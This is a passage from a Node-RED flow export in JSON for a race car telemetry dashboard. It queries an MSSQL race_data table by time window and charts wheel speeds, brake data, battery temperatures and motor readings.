        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_torque_feedback);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Torque Feedback\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 700,
        "wires": [
            [
                "c859318291e219b9"
            ]
        ]
    },
    {
        "id": "9aed8cfc618d4047",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_commanded_torque);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Commanded Torque\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 740,
        "wires": [
            [
                "9519568a49fdb295"
            ]
        ]
    },
    {
        "id": "c859318291e219b9",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Torque Feedback",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1230,
        "y": 700,
        "wires": [
            []
        ]
    },
    {
        "id": "9519568a49fdb295",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Commanded Torque",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1240,
        "y": 740,
        "wires": [
            []
        ]
    },
    {
        "id": "d13d415264b13a20",
        "type": "function",
        "z": "0208dc768b26306e",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.wheel_speed_front_left);\nlet series2 = msg.payload.map(item => item.wheel_speed_front_right);\nlet series3 = msg.payload.map(item => item.wheel_speed_rear_left);\nlet series4 = msg.payload.map(item => item.wheel_speed_rear_right);\n\nmsg.payload = [\n    {\n        \"series\": [\"Wheel Speed Front Left\", \"Wheel Speed Front Right\", \"Wheel Speed Rear Left\", \"Wheel Speed Rear Right\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 800,
        "wires": [
            [
                "a18d3b58dcc60ce6"
            ]
        ]
    },
    {
        "id": "a18d3b58dcc60ce6",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "16",
        "height": "9",
        "label": "All Vars",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1200,
        "y": 800,
        "wires": [
            []
        ]
    },
    {
        "id": "416f9617b4288588",
        "type": "MSSQL",
        "z": "eb28fbcf28e5aae9",
        "mssqlCN": "933ce03686fddbab",
        "name": "Past Data",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT *\nFROM dbo.race_data\nWHERE timestamp BETWEEN '{{payload.start_time}}' AND '{{payload.end_time}}'\nORDER BY timestamp",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "payload.selectedDateTime",
        "paramsOptType": "msg",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 800,
        "y": 140,
        "wires": [
            [
                "781e968617198999",
                "5ea20cae93e67743",
                "067ea4b861a76345",
                "ddb3793baa665a2b",
                "2450c410b4c90958",
                "648b3a05a867bfb6",
                "dc1ae1aafb033480",
                "cca48cef66a2c49d",
                "9aa6592d1262b5b2",
                "60fd3fd1490c62d5",
                "08d1eddcb59d0d2b",
                "846b2dcf25742263",
                "c38968523ba4a727",
                "b1f884da881c8fc2"
            ]
        ]
    },
    {
        "id": "759ee1b25d57a0f8",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "name": "Convert Date & Time",
        "func": "// Extract date and time components from the incoming message\nvar start_time = msg.payload.starting_time; // Assuming date is provided by ui_date node\nvar duration = msg.payload.duration; // Assuming time is provided by ui_time node\n\nstart_time = start_time / 1000;     //Convert from milliseconds to seconds\nstart_time = start_time + 5*60*60;  //Convert to EST by adding 5 hours \n\nduration = duration * 60;    //Convert duration from minutes to seconds\n\nmsg.payload =\n{\n    start_time: start_time,\n    end_time : start_time + duration\n}\n\n// Pass the modified message to the next node in the flow\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 540,
        "y": 140,
        "wires": [
            [
                "8c039838fd59fb40",
                "416f9617b4288588"
            ]
        ]
    },
    {
        "id": "8c039838fd59fb40",
        "type": "ui_text",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "payload",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 800,
        "y": 100,
        "wires": []
    },
    {
        "id": "5a726595eecbd189",
        "type": "ui_text_input",
        "z": "eb28fbcf28e5aae9",
        "name": "",
        "label": "Starting Time",
        "tooltip": "",
        "group": "138120695bcd6cbc",
        "order": 4,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "datetime-local",
        "delay": 300,
        "topic": "starting_time",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 140,
        "y": 120,
        "wires": [
            [
                "241e5be9fe6915e5",
                "0f64fb62f2acf3f9"
            ]
        ]
    },
    {
        "id": "59182ad2fc64eb19",
        "type": "ui_slider",
        "z": "eb28fbcf28e5aae9",
        "name": "",
        "label": "Duration (Minutes)",
        "tooltip": "",
        "group": "138120695bcd6cbc",
        "order": 4,
        "width": 0,
        "height": 0,
        "passthru": true,
        "outs": "all",
        "topic": "duration",
        "topicType": "str",
        "min": 0,
        "max": "30",
        "step": 1,
        "className": "",
        "x": 150,
        "y": 160,
        "wires": [
            [
                "241e5be9fe6915e5",
                "d29c9b07593fc9cb"
            ]
        ]
    },
    {
        "id": "241e5be9fe6915e5",
        "type": "join",
        "z": "eb28fbcf28e5aae9",
        "name": "",
        "mode": "custom",
        "build": "object",
        "property": "payload",
        "propertyType": "msg",
        "key": "topic",
        "joiner": "\\n",
        "joinerType": "str",
        "accumulate": true,
        "timeout": "",
        "count": "2",
        "reduceRight": false,
        "reduceExp": "",
        "reduceInit": "",
        "reduceInitType": "",
        "reduceFixup": "",
        "x": 330,
        "y": 140,
        "wires": [
            [
                "759ee1b25d57a0f8",
                "1a24d7f3601e2f02"
            ]
        ]
    },
    {
        "id": "0f64fb62f2acf3f9",
        "type": "ui_text",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Start",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 270,
        "y": 60,
        "wires": []
    },
    {
        "id": "d29c9b07593fc9cb",
        "type": "ui_text",
        "z": "eb28fbcf28e5aae9",
        "group": "138120695bcd6cbc",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Duration",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 300,
        "y": 220,
        "wires": []
    },
    {
        "id": "1a24d7f3601e2f02",
        "type": "ui_text",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Func Input",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 490,
        "y": 180,
        "wires": []
    },
    {
        "id": "781e968617198999",
        "type": "ui_text",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "SQL Query Results",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 1010,
        "y": 140,
        "wires": []
    },
    {
        "id": "5ea20cae93e67743",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.wheel_speed_front_left);\nlet series2 = msg.payload.map(item => item.wheel_speed_front_right);\nlet series3 = msg.payload.map(item => item.wheel_speed_rear_left);\nlet series4 = msg.payload.map(item => item.wheel_speed_rear_right);\n\nmsg.payload = [\n    {\n        \"series\": [\"Wheel Speed Front Left\", \"Wheel Speed Front Right\", \"Wheel Speed Rear Left\", \"Wheel Speed Rear Right\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 180,
        "wires": [
            [
                "dbc2965cad1ea5d1"
            ]
        ]
    },
    {
        "id": "dbc2965cad1ea5d1",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Wheel Speeds",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1260,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "067ea4b861a76345",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.brake_pressure_front);\nlet series2 = msg.payload.map(item => item.brake_pressure_rear);\n\nmsg.payload = [\n    {\n        \"series\": [\"Front Brake Pressure\", \"Rear Brake Pressure\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 220,
        "wires": [
            [
                "be171d6b0c5a7e27"
            ]
        ]
    },
    {
        "id": "be171d6b0c5a7e27",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Brake Pressures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1260,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "ddb3793baa665a2b",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.steering_angle);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Steering Angle\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 260,
        "wires": [
            [
                "d95d5b4990bca00c"
            ]
        ]
    },
    {
        "id": "d95d5b4990bca00c",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Steering Angle",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1260,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "2450c410b4c90958",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.vehicle_speed);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Vehicle Speed\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 300,
        "wires": [
            [
                "461cd5cc376a0a6d"
            ]
        ]
    },
    {
        "id": "461cd5cc376a0a6d",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Vehicle Speed",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1260,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "648b3a05a867bfb6",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.high_temp);\nlet series2 = msg.payload.map(item => item.low_temp);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"High temperatures\", \"Low temperatures\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 340,
        "wires": [
            [
                "b2171eb5ca062c37"
            ]
        ]
    },
    {
        "id": "b2171eb5ca062c37",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "High/Low Battery Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1310,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "dc1ae1aafb033480",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_open_voltage);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Open Voltage\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 380,
        "wires": [
            [
                "5b1f70bb8ff8d693"
            ]
        ]
    },
    {
        "id": "5b1f70bb8ff8d693",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Pack Open Voltage",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1270,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "cca48cef66a2c49d",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_amp_hours);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Amp Hours\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 420,
        "wires": [
            [
                "6218abde45054d3d"
            ]
        ]
    },
    {
        "id": "6218abde45054d3d",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Pack Amp Hours",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1270,
        "y": 420,
        "wires": [
            []
        ]
    },
    {
        "id": "9aa6592d1262b5b2",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_speed);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Speed\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 460,
        "wires": [
            [
                "caa1d8c0e02b5464"
            ]
        ]
    },
    {
        "id": "caa1d8c0e02b5464",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Motor Speed",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1250,
        "y": 460,
        "wires": [
            []
        ]
    },
    {
        "id": "60fd3fd1490c62d5",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_temperature);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Temperature\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 500,
        "wires": [
            [
                "539dccea29e2df46"
            ]
        ]
    },
    {
        "id": "539dccea29e2df46",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Motor Temperature",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1270,
        "y": 500,
        "wires": [
            []
        ]
    },
    {
        "id": "08d1eddcb59d0d2b",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.brake_temperature_front_left);\nlet series2 = msg.payload.map(item => item.brake_temperature_front_right);\nlet series3 = msg.payload.map(item => item.brake_temperature_rear_left);\nlet series4 = msg.payload.map(item => item.brake_temperature_rear_right);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Brake Temp Front Left\", \"Brake Temperature Front Right\", \"Brake Temperature Rear Left\", \"Brake Temperature Rear Right\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 540,
        "wires": [
            [
                "167ba8a33f858ed6"
            ]
        ]
    },
    {
        "id": "167ba8a33f858ed6",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Brake Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1280,
        "y": 540,
        "wires": [
            []
        ]
    },
    {
        "id": "846b2dcf25742263",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_torque_feedback);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Torque Feedback\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 580,
        "wires": [
            [
                "03f5af36309c76ea"
            ]
        ]
    },
    {
        "id": "c38968523ba4a727",
        "type": "function",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_commanded_torque);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Commanded Torque\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 620,
        "wires": [
            [
                "a495d3909dedb2c3"
            ]
        ]
    },
    {
        "id": "03f5af36309c76ea",
        "type": "ui_chart",
        "z": "eb28fbcf28e5aae9",
        "d": true,
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Torque Feedback",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
